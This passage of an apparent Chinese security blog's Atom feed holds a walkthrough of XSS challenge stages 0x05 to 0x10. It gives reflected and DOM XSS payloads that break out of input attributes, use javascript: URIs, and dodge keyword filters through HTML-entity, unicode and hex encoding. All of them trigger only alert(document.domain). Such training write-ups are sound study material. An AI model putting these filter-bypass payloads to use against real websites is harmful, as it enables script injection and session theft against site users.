        &lt;h3 id=&quot;一-绕过-xss-filter-的方法&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-绕过-xss-filter-的方法&quot;&gt;&lt;/a&gt; 一、绕过 XSS Filter 的方法&lt;/h3&gt;
&lt;h4 id=&quot;1逃离-的束缚&quot;&gt;&lt;a clas
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Th1s_i3_XSS_challenges&amp;from:stage#5&amp;to:stage#12</title>
    <link href="https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/08/2020.03.08（99）/</id>
    <published>2020-03-07T16:00:00.000Z</published>
    <updated>2020-03-09T11:24:32.267Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x05-length-limited-textfont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-length-limited-textfont"></a> <font color="navy">0x05 Length limited text</font></h3><h4 id="hint"><a class="markdownIt-Anchor" href="#hint"></a> <code>Hint</code></h4><blockquote><p><font color="white">length limited text box</font></p></blockquote><h4 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> <code>题目分析</code></h4><blockquote><p>① 首先在输入框中随便输入值 <code>alert(/xss/)</code>，点击<code>search</code>，打开源代码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">maxlength</span>=<span class="string">"15"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">value</span>=<span class="string">"alert(/xss/)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不难发现我们输的的字符串被赋值给了 <code>value</code> ，那么下一步进行闭合绕过：<code>&quot; onclick=alert(document.domain)</code>，但是在构造的时候却发现，输入框被允许输入最大的字符串长度为<code>15</code>，所以我们的payload无效；</p><p><br>② 虽然输入框要求只能输入 <code>15</code> 个字符串，但是我们可以利用 <code>burpsuit</code> 进行抓包改包，达到我们想要的效果：</p></blockquote><p><img src="/images/99-1.png" alt></p><blockquote><p>点击<code>Forward</code>，发送我们修改过的包，然后再点击输入框，弹窗成功：</p></blockquote><p><img src="/images/99-2.png" alt></p><h4 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> <code>相关知识点</code></h4><blockquote><ol><li><code>burpsuit</code> 的使用</li></ol></blockquote><h4 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1:" onclick/onmouseup/onmousedown = alert(document.domain)</span><br><span class="line">payload2:"&gt;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)/</span>&gt;</span></span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">payload4:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注</strong>：以上payload需在 burpsuit 中进行；</p></blockquote><h4 id="题目类型"><a class="markdownIt-Anchor" href="#题目类型"></a> <code>题目类型</code></h4><blockquote><p>简单的标签闭合问题，并且利用 burpsuit 进行重放的题目</p></blockquote><h3 id="font-color-navy0x06-input-标签内部-js-事件font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-input-标签内部-js-事件font"></a> <font color="navy">0x06 <code>&lt;input&gt;</code> 标签内部 JS 事件</font></h3><h4 id="hint-2"><a class="markdownIt-Anchor" href="#hint-2"></a> <code>Hint</code></h4><blockquote><p><font color="white"></font></p></blockquote><h4 id="题目分析-2"><a class="markdownIt-Anchor" href="#题目分析-2"></a> <code>题目分析</code></h4><blockquote><p>① 在输入框中试探性的输入 <code>&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> &amp;<span class="attr">gt</span>;&amp;<span class="attr">lt</span>;<span class="attr">script</span>&amp;<span class="attr">gt</span>;<span class="attr">alert</span>(=<span class="string">""</span> <span class="attr">xss</span>=<span class="string">""</span> )&amp;<span class="attr">lt</span>;=<span class="string">""</span> <span class="attr">script</span>&amp;<span class="attr">gt</span>;"=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果中可以看出，将我们输入的 <code>&lt;</code> 和<code>&gt;</code> 进行了一次实体编码，那么我们不能再利用 <code>&lt;</code> 和 <code>&gt;</code> 进行闭合绕过了，我们可以用上个题目中的 payload1 进行尝试，果然成功弹窗。</p></blockquote><h4 id="相关知识点-2"><a class="markdownIt-Anchor" href="#相关知识点-2"></a> <code>相关知识点</code></h4><blockquote><ol><li>利用 <code>on+event</code> 进行弹窗</li></ol></blockquote><h4 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:" onclick/onmouseup/onmousedown/on+evet = alert(document.domain)</span><br></pre></td></tr></table></figure><h4 id="题目类型-2"><a class="markdownIt-Anchor" href="#题目类型-2"></a> <code>题目类型</code></h4><blockquote><p>不用闭合标签，在标签内部添加事件，通过触发事件来执行 <code>payload</code>。</p></blockquote><h3 id="font-color-navy0x07-input-标签内部-js-事件font"><a class="markdownIt-Anchor" href="#font-color-navy0x07-input-标签内部-js-事件font"></a> <font color="navy">0x07 <code>&lt;input &gt;</code>标签内部 js 事件</font></h3><h4 id="hint-3"><a class="markdownIt-Anchor" href="#hint-3"></a> <code>Hint</code></h4><blockquote><p><font color="white">nearly the same… but a bit more tricky.</font></p></blockquote><h4 id="题目分析-3"><a class="markdownIt-Anchor" href="#题目分析-3"></a> <code>题目分析</code></h4><blockquote><p>① 和上面的题目一样，首先来浏览器如何解析我们的输入：<code>&quot; onclick=alert(document.domain)</code>，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(document.domain)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>② 看到源码后，我觉得构造的payload被成功执行了，于是点击输入框，果真弹窗成功。</p></blockquote><h4 id="相关知识点-3"><a class="markdownIt-Anchor" href="#相关知识点-3"></a> <code>相关知识点</code></h4><blockquote><p>和上一道题目没有太大的区别</p></blockquote><h4 id="payload-3"><a class="markdownIt-Anchor" href="#payload-3"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick=alert(document.domain)</span><br></pre></td></tr></table></figure><h4 id="题目类型-3"><a class="markdownIt-Anchor" href="#题目类型-3"></a> <code>题目类型</code></h4><blockquote><p>和上一道题目没有太大的区别</p></blockquote><h3 id="font-color-navy0x08-javascript伪协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x08-javascript伪协议font"></a> <font color="navy">0x08 javascript:伪协议</font></h3><h4 id="hint-4"><a class="markdownIt-Anchor" href="#hint-4"></a> <code>Hint</code></h4><blockquote><p><font color="white">the ‘javascript’ scheme.</font></p></blockquote><h4 id="题目分析-4"><a class="markdownIt-Anchor" href="#题目分析-4"></a> <code>题目分析</code></h4><blockquote><p>① 和前面的题目一样，首先输入一些字符串，来看看浏览器怎么执行的，在这里我输入的是<code>/xss/</code>，结果如下图：</p></blockquote><p><img src="/images/99-3.png" alt></p><blockquote><p>② 在清楚浏览器是将我们的输入变为一个链接，文本和链接的内容都是我们输入的内容，这道题就不能再利用闭合绕过的原理了，这道题目需要一个新的知识点：<code>伪协议</code></p></blockquote><h4 id="相关知识点-4"><a class="markdownIt-Anchor" href="#相关知识点-4"></a> <code>相关知识点</code></h4><blockquote><ol><li>伪协议 <code>javascript:</code> 的使用</li><li>javascript 的入口</li></ol></blockquote><h4 id="payload-4"><a class="markdownIt-Anchor" href="#payload-4"></a> <code>payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><blockquote><p>执行成功，如下图所示：</p></blockquote><p><img src="/images/99-4.png" alt></p><h4 id="题目类型-4"><a class="markdownIt-Anchor" href="#题目类型-4"></a> <code>题目类型</code></h4><blockquote><p><code>&lt;a&gt;</code> 标签中 <code>href</code> 的构造</p></blockquote><h3 id="font-color-navy0x09-utf-7font"><a class="markdownIt-Anchor" href="#font-color-navy0x09-utf-7font"></a> <font color="navy">0x09 UTF-7</font></h3><h4 id="hint-5"><a class="markdownIt-Anchor" href="#hint-5"></a> <code>Hint</code></h4><blockquote><p><code>UTF-7 XSS</code></p></blockquote><h4 id="题目分析-5"><a class="markdownIt-Anchor" href="#题目分析-5"></a> <code>题目分析</code></h4><blockquote><p>之所以把提示给显示出来，是因为这是一道 <code>utf-7</code> 问题的题目，需要在 <code>IE7</code> 浏览器才能执行，而且现在用的都是 <code>utf-8</code>，<code>utf-7</code> 早已经被淘汰了，所以这道题目忽略，如果想要这道题目，直接在 f12 中的 <code>console</code> 下输入 <code>alert(document.domain)</code>，就能前往下一题；</p></blockquote><h4 id="相关知识点-5"><a class="markdownIt-Anchor" href="#相关知识点-5"></a> <code>相关知识点</code></h4><blockquote><p>utf-7</p></blockquote><h4 id="payload-5"><a class="markdownIt-Anchor" href="#payload-5"></a> <code>payload</code></h4><blockquote><p>在 f12 中的 <code>console</code> 下输入 <code>alert(document.domain)</code></p></blockquote><h4 id="题目类型-5"><a class="markdownIt-Anchor" href="#题目类型-5"></a> <code>题目类型</code></h4><blockquote><p>utf-7 问题</p></blockquote><h3 id="font-color-navy0x0a-字符编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x0a-字符编码绕过font"></a> <font color="navy">0x0A 字符/编码绕过</font></h3><h4 id="hint-6"><a class="markdownIt-Anchor" href="#hint-6"></a> <code>Hint</code></h4><blockquote><p><font color="white"> s/domain//g;</font></p></blockquote><h4 id="题目分析-6"><a class="markdownIt-Anchor" href="#题目分析-6"></a> <code>题目分析</code></h4><blockquote><p>① 在输入框中输入 <code>&quot; onclick=alert(document.domain)</code> ，并查看源码，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(document.)"</span>"&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以看到浏览器将我们输入的 <code>domain</code> 给过滤掉了，而且在<code>)</code>后面多了一个<code>&quot;</code>，所以在构造的时候还要将它闭合/注释掉；</p><p>② 我们可以通过根据浏览器原理来进行构造:</p><p>        ▪ 根据 <code>HTML实体编码</code>  的原理可以这样构造：<code>&quot; onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) &quot;</code></p><p>        ▪ 根据 <code>&lt;svg&gt; 和 javascript 编码的原理</code> 还可以这样构造：<code>&quot;&gt;&lt;svg&gt;&lt;script&gt;alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)&lt;/script&gt;&lt;/svg&gt;</code> 和 <code>&quot;&gt;&lt;script&gt;alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)&lt;/script&gt;</code></p></blockquote><h4 id="相关知识点s"><a class="markdownIt-Anchor" href="#相关知识点s"></a> <code>相关知识点s</code></h4><blockquote><ol><li>HTML 编码、JavaScript 编码</li></ol></blockquote><h4 id="payload-6"><a class="markdownIt-Anchor" href="#payload-6"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1:" onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) "</span><br><span class="line">pauload2:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">payload4:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.\u0064\u006f\u006d\u0061\u0069\u006e)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload5:"&gt;<span class="tag">&lt;<span class="name">script</span>/<span class="attr">src</span>=<span class="string">http://locahost/payload.js</span>&gt;</span>"<span class="tag">&lt;/<span class="name">script</span>&gt;</span> // payload.js 文件里面的内容为：alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)</span><br><span class="line">payload6:"&gt;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)</span>&gt;</span></span><br><span class="line">payload7:" onclick=alert(document.domdomainain);</span><br></pre></td></tr></table></figure><h4 id="题目类型-6"><a class="markdownIt-Anchor" href="#题目类型-6"></a> <code>题目类型</code></h4><blockquote><p>编码绕过以及字符绕过</p></blockquote><h3 id="font-color-navy0x0b-伪协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x0b-伪协议font"></a> <font color="navy">0x0B 伪协议</font></h3><h4 id="hint-7"><a class="markdownIt-Anchor" href="#hint-7"></a> <code>Hint</code></h4><blockquote><p><font color="white">“s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”</font></p></blockquote><h4 id="题目分析-7"><a class="markdownIt-Anchor" href="#题目分析-7"></a> <code>题目分析</code></h4><blockquote><p>① 初尝试：将 <code>onclick = alert(document.domain)&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> 输入框中，打开源码得到如下的结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"onxxx= alert(document.domain)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xscript</span>&gt;</span>alert(document.domain)<span class="tag">&lt;/<span class="name">xscript</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出，浏览器将我们输的 <code>script</code> 变为了 <code>xscript</code>，将 <code>on+event=</code> 变成了 <code>onxxx=</code>，所以构造失败。</p><p>② 绕过：既然有过滤的作用，那么我们是不是可以通过编码绕过呢？<code>script</code> 作为标签的话无法进行编码绕过，否则就会被解码为普通字符串（HTML 解码）或者不能解码（unicode 编码），那么就要想出来一个既能被解码为 <code>script</code> 又能执行 <code>alert(document.domain)</code> 函数的 <code>javascript</code> 的入口，想来想去有一个可以这样做的 <code>javascript:</code> 伪协议，如果用 <code>HTML 实体编码</code> 进行编码的话，浏览器会正常解码，并且 <code>url 编码</code> 也能正常找到地址入口，所以可以的。</p><p>③ 构造 payload：这道题目的 payload 其实和上一道题目的 payload2 相似，只不过是编码的位置不同；</p></blockquote><h4 id="相关知识点-6"><a class="markdownIt-Anchor" href="#相关知识点-6"></a> <code>相关知识点</code></h4><blockquote><ol><li>伪协议的相关知识</li></ol></blockquote><h4 id="payload-7"><a class="markdownIt-Anchor" href="#payload-7"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(document.domain)"</span>&gt;</span>/xss/<span class="tag">&lt;/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="题目类型-7"><a class="markdownIt-Anchor" href="#题目类型-7"></a> <code>题目类型</code></h4><blockquote><p>实体编码绕过</p></blockquote><h3 id="font-color-navy0x0c-反引号的特性font"><a class="markdownIt-Anchor" href="#font-color-navy0x0c-反引号的特性font"></a> <font color="navy">0x0C 反引号的特性</font></h3><h4 id="hint-8"><a class="markdownIt-Anchor" href="#hint-8"></a> <code>Hint</code></h4><blockquote><p><font color="white">“s/[\x00-\x20\&lt;\&gt;\”\’]//g;&quot;</font></p></blockquote><h4 id="题目分析-8"><a class="markdownIt-Anchor" href="#题目分析-8"></a> <code>题目分析</code></h4><blockquote><p>① 同样先输入一些字符串进行试探以下 <code>&quot; onclick=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;/xss/&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>  得到的源码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"onclick=alert(1)ahref=javascript:alert(1)/xss//ascriptalert(1)/script"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以看出来，浏览器将我们输入字符串中的 <code>&quot;</code> 、<code>'</code>、<code>&lt;</code> 和 <code>&gt;</code> 进行过滤掉了，所以我们要换一个思路逃逸 <code>&quot;</code> 的束缚；</p></blockquote><h4 id="相关知识点-7"><a class="markdownIt-Anchor" href="#相关知识点-7"></a> <code>相关知识点</code></h4><blockquote><ol><li>反引号的特性：<ol><li>如果 <code>(</code> 和 <code>)</code> 被过滤掉，那么就可以用 `` 来代替，同样能够被成功执行；</li><li>如果 <code>&quot;</code> 和 <code>'</code> 被过滤掉，那么在 <code>IE</code> 浏览器下也可以用反引号 ` 来代替；</li></ol></li></ol></blockquote><h4 id="payload-8"><a class="markdownIt-Anchor" href="#payload-8"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:`` onclick=alert(document.domain)   <span class="comment">&lt;!-- 须在 IE 浏览器下执行 --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="题目类型-8"><a class="markdownIt-Anchor" href="#题目类型-8"></a> <code>题目类型</code></h4><blockquote><p>逃离 <code>&quot;</code> 的束缚</p></blockquote><h3 id="font-color-navy0x0d-css1font"><a class="markdownIt-Anchor" href="#font-color-navy0x0d-css1font"></a> <font color="navy">0x0D css1</font></h3><h4 id="hint-9"><a class="markdownIt-Anchor" href="#hint-9"></a> <code>Hint</code></h4><blockquote><p><code>style attribute</code></p></blockquote><h4 id="题目分析-9"><a class="markdownIt-Anchor" href="#题目分析-9"></a> <code>题目分析</code></h4><blockquote><p>① 这是一道利用 <code>css</code>  进行 xss 的题目，需要用到 css <code>expression</code> ，这道题暂时不做</p></blockquote><h4 id="相关知识点-8"><a class="markdownIt-Anchor" href="#相关知识点-8"></a> <code>相关知识点</code></h4><blockquote><ol><li>css 的 payload（需要整理）</li></ol></blockquote><h4 id="payload-9"><a class="markdownIt-Anchor" href="#payload-9"></a> <code>payload</code></h4><h4 id="题目类型-9"><a class="markdownIt-Anchor" href="#题目类型-9"></a> <code>题目类型</code></h4><h3 id="font-color-navy0x0e-css2font"><a class="markdownIt-Anchor" href="#font-color-navy0x0e-css2font"></a> <font color="navy">0x0E css2</font></h3><h4 id="hint-10"><a class="markdownIt-Anchor" href="#hint-10"></a> <code>Hint</code></h4><blockquote><p><code>s/(url|script|eval|expression)/xxx/ig;</code></p></blockquote><h4 id="题目分析-10"><a class="markdownIt-Anchor" href="#题目分析-10"></a> <code>题目分析</code></h4><blockquote><p>这也是一道 css 的题目，后面再做</p></blockquote><h4 id="相关知识点-9"><a class="markdownIt-Anchor" href="#相关知识点-9"></a> <code>相关知识点</code></h4><h4 id="payload-10"><a class="markdownIt-Anchor" href="#payload-10"></a> <code>payload</code></h4><h4 id="题目类型-10"><a class="markdownIt-Anchor" href="#题目类型-10"></a> <code>题目类型</code></h4><h3 id="font-color-navy0x0f-dom-xssfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0f-dom-xssfont"></a> <font color="navy">0x0F DOM xss</font></h3><h4 id="hint-11"><a class="markdownIt-Anchor" href="#hint-11"></a> <code>Hint</code></h4><blockquote><p><font color="white">document.write();</font></p></blockquote><h4 id="题目分析-11"><a class="markdownIt-Anchor" href="#题目分析-11"></a> <code>题目分析</code></h4><blockquote><p>① 先输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ，看一下 value 值处有没有 xss 可以利用的漏洞，发现很难逃离双引号的束缚，于是看一下有没有别的地方有可以利用的地方，发现可以利用 <code>document.write</code> 的输出进行构造，但是这个函数因为是在js范畴，<code>document.write</code> 在输出的时候会 <code>JavascriptDecode</code>一下数据，会把数据原有 <code>\</code> 去除。</p></blockquote><h4 id="相关知识点-10"><a class="markdownIt-Anchor" href="#相关知识点-10"></a> <code>相关知识点</code></h4><blockquote><ol><li><code>document.write</code> 的相关知识点：<ol><li>document.write知多少：<a href="https://segmentfault.com/a/1190000006197157" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006197157</a></li></ol></li></ol></blockquote><h4 id="payload-11"><a class="markdownIt-Anchor" href="#payload-11"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:\\x3csvg\\x2fonload=alert(document.domain)\\x3e</span><br></pre></td></tr></table></figure><h4 id="题目类型-11"><a class="markdownIt-Anchor" href="#题目类型-11"></a> <code>题目类型</code></h4><blockquote><p>DOM xss</p></blockquote><h3 id="font-color-navy0x10-documentwritefont"><a class="markdownIt-Anchor" href="#font-color-navy0x10-documentwritefont"></a> <font color="navy">0x10 document.write()</font></h3><h4 id="hint-12"><a class="markdownIt-Anchor" href="#hint-12"></a> <code>Hint</code></h4><blockquote><p><font color="white"> “document.write();” and “s/\\x/\\\x/ig;”</font></p></blockquote><h4 id="题目分析-12"><a class="markdownIt-Anchor" href="#题目分析-12"></a> <code>题目分析</code></h4><blockquote><p>和上一道题目一样，但是不同的是将 <code>\x</code> 变为了<code>\\x</code> 所以上一道题目的 payload 就无法被执行了，但是我们知道 javascript 编码的格式</p></blockquote><h4 id="相关知识点-11"><a class="markdownIt-Anchor" href="#相关知识点-11"></a> <code>相关知识点</code></h4><blockquote><ol><li><p>document.write 的相关知识点</p></li><li><p>javascript 可以解析的编码形式：</p></li></ol></blockquote><table><thead><tr><th style="text-align:center">进制</th><th style="text-align:center">格式</th><th style="text-align:center">举例</th></tr></thead><tbody><tr><td style="text-align:center">ascii(默认)</td><td style="text-align:center">无</td><td style="text-align:center">&gt;(62)</td></tr><tr><td style="text-align:center">八进制</td><td style="text-align:center">\0（三位，不足补 0 ）</td><td style="text-align:center">\074</td></tr><tr><td style="text-align:center">十六进制</td><td style="text-align:center">\x00</td><td style="text-align:center">\x3</td></tr><tr><td style="text-align:center">unicode 编码</td><td style="text-align:center">\u00</td><td style="text-align:center">\u003c</td></tr></tbody></table><h4 id="payload-12"><a class="markdownIt-Anchor" href="#payload-12"></a> <code>payload</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:\\u003csvg\\u002fonload=alert(document.domain)\\u003e</span><br></pre></td></tr></table></figure><h4 id="题目类型-12"><a class="markdownIt-Anchor" href="#题目类型-12"></a> <code>题目类型</code></h4><h3 id="font-color-brown0x11-0x12-skippedfont"><a class="markdownIt-Anchor" href="#font-color-brown0x11-0x12-skippedfont"></a> <font color="brown">0x11- 0x12 skipped</font></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x05-length-limited-textfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x05-length-limited-textfont&quot;&gt;&lt;/a&gt; &lt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
</feed>
